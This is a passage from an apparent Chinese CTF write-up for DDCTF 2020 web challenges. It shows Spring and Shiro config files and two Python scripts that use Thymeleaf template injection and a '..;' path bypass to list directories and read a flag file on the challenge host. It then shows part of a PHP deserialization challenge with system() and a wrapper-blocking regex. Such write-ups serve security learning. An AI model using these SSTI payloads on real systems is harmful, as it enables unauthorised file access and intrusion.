class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-web.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.ctf.util.SafeFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>403<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/spring-web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 自动扫描 Controller 包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf.controller"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf.repository"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf.service"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 注解配置和乱码处理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.StringHttpMessageConverter"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/spring-core.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:jee</span>=<span class="string">"http://www.springframework.org/schema/jee"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">"http://www.springframework.org/schema/tx"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-shiro.xml"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 声明自动为spring容器中那些配置@Aspectj切面的bean创建代理，织入切面 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 支持事物注解（@Transactional） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"viewResolver"</span> <span class="attr">class</span>=<span class="string">"org.thymeleaf.spring4.view.ThymeleafViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"order"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"characterEncoding"</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"templateEngine"</span> <span class="attr">ref</span>=<span class="string">"templateEngine"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"templateEngine"</span> <span class="attr">class</span>=<span class="string">"org.thymeleaf.spring4.SpringTemplateEngine"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"templateResolver"</span> <span class="attr">ref</span>=<span class="string">"templateResolver"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"templateResolver"</span> <span class="attr">class</span>=<span class="string">"org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/templates/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".html"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"templateMode"</span> <span class="attr">value</span>=<span class="string">"HTML5"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cacheable"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"characterEncoding"</span>  <span class="attr">value</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Service"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Repository"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/com/ctf/util/SafeFilter.class</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907150313875.png" alt="image-20200907150313875"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907150429584.png" alt="image-20200907150429584"></p>
<p>WEB-INF/classes/com/ctf/controller/IndexController.class</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907194322445.png" alt="image-20200907194322445"></p>
<p>WEB-INF/classes/com/ctf/controller/AuthController.class</p>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907194510559.png" alt="image-20200907194510559" style="zoom:150%;">

<p>WEB-INF/classes/com/ctf/auth/ShiroRealm.class</p>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907194341223.png" alt="image-20200907194341223" style="zoom:150%;">

<p>参考l3yx的wp脚本，考点是thymeleaf模板注入。</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"116.85.37.131"</span>,</span><br><span class="line">    <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"Origin"</span>: <span class="string">"http://116.85.37.131"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/index"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render</span><span class="params">(payload)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] submit..."</span>)</span><br><span class="line">    url = <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize"</span></span><br><span class="line">    data = <span class="string">"content="</span>+urllib.parse.quote_plus(payload)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url = url,headers = headers,data = data)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">"Success! Please fetch .(.*)? !"</span>,res.text) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(res.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">"Success! Please fetch .(.*)? !"</span>,res.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] getResult..."</span>)</span><br><span class="line">    url = <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef"</span>+url</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getString</span><span class="params">(string)</span>:</span></span><br><span class="line">    strc=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        strc = strc + <span class="string">"T(com.ctf.model.User).getName()[3].replace(46,&#123;&#125;)+"</span>.format(str(ord(i)))</span><br><span class="line">    <span class="keyword">return</span> strc[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getClass</span><span class="params">(className)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"T(com.ctf.model.User).getClassLoader().loadClass("</span>+getString(className)+<span class="string">")"</span></span><br><span class="line"></span><br><span class="line">poc = <span class="string">"$&#123;"</span>+getClass(<span class="string">"java.util.Arrays"</span>)+<span class="string">".toString("</span>+    getClass(<span class="string">"java.nio.file.Files"</span>)+<span class="string">".list("</span>+getClass(<span class="string">"java.nio.file.Paths"</span>)+<span class="string">".get("</span>+getString(<span class="string">"/"</span>)+<span class="string">")).toArray()"</span>     +<span class="string">")&#125;"</span></span><br><span class="line">poc = <span class="string">"&lt;input th:value="</span>+poc+<span class="string">"&gt;"</span></span><br><span class="line">print(getResult(render(poc)))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">"$&#123;"</span>+getClass(<span class="string">"java.util.Arrays"</span>)+<span class="string">".toString("</span>+    getClass(<span class="string">"java.nio.file.Files"</span>)+<span class="string">".lines("</span>+getClass(<span class="string">"java.nio.file.Paths"</span>)+<span class="string">".get("</span>+getString(<span class="string">"/flag_is_here"</span>)+<span class="string">")).toArray()"</span>     +<span class="string">")&#125;"</span></span><br><span class="line">poc = <span class="string">"&lt;input th:value="</span>+poc+<span class="string">"&gt;"</span></span><br><span class="line">print(getResult(render(poc)))</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907151746252.png" alt="image-20200907151746252"></p>
<blockquote>
<p>参考<a href="https://wulidecade.cn/2020/09/06/2020DDCTF-wp/#more" target="_blank" rel="noopener">decade</a>的解法，是利用1.class.forname()获取类，用String类动态生成字符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    payload = <span class="string">'T(Character).toString(%s)'</span> % ord(message[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">        payload +=<span class="string">'.concat(T(Character).toString(%s))'</span> % ord(ch)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/xxx/..;/web/68759c96217a32d5b368ad2965f625ef/customize"</span></span><br><span class="line">pattern = re.compile(<span class="string">"render\/(.*?) !"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># GetFlagName</span></span><br><span class="line">message =<span class="string">'1.class. forName(&#123;Files&#125;).list(1.class. forName(&#123;Paths&#125;).get(&#123;path&#125;)).toArray()[19]'</span>.format(Files=encode(<span class="string">"java.nio.file.Files"</span>), Paths=encode(<span class="string">"java.nio.file.Paths"</span>), path=encode(<span class="string">"/"</span>))</span><br><span class="line">res1 = requests.post(url,data = &#123;<span class="string">"content"</span>:<span class="string">"[[$&#123;"</span>+message+<span class="string">"&#125;]]"</span>&#125;)</span><br><span class="line">render = pattern.search(res1.text)</span><br><span class="line">renderurl = requests.get(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/xxx/..;/web/68759c96217a32d5b368ad2965f625ef/render/&#123;&#125;"</span>.format(render.group(<span class="number">1</span>)))</span><br><span class="line"><span class="comment"># print(renderurl.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GetFlag</span></span><br><span class="line">message = <span class="string">'1.class. forName(&#123;Files&#125;).lines(1.class. forName(&#123;Paths&#125;).get(&#123;path&#125;)).toArray()[0]'</span>.format(Files=encode(<span class="string">"java.nio.file.Files"</span>), Paths=encode(<span class="string">"java.nio.file.Paths"</span>), path=encode(<span class="string">"/flag_is_here"</span>))</span><br><span class="line">res2 = requests.post(url,data = &#123;<span class="string">"content"</span>:<span class="string">"[[$&#123;"</span>+message+<span class="string">"&#125;]]"</span>&#125;)</span><br><span class="line">render = pattern.search(res2.text)</span><br><span class="line">renderurl = requests.get(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/xxx/..;/web/68759c96217a32d5b368ad2965f625ef/render/&#123;&#125;"</span>.format(render.group(<span class="number">1</span>)))</span><br><span class="line">print(renderurl.text)</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="0x04-overwrite-me"><a href="#0x04-overwrite-me" class="headerlink" title="0x04 overwrite me"></a>0x04 overwrite me</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">'find /FlagNeverFall '</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prompter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i"</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Don't Do That!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'/hint/hint.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">"POP me! I can give you some hints!"</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 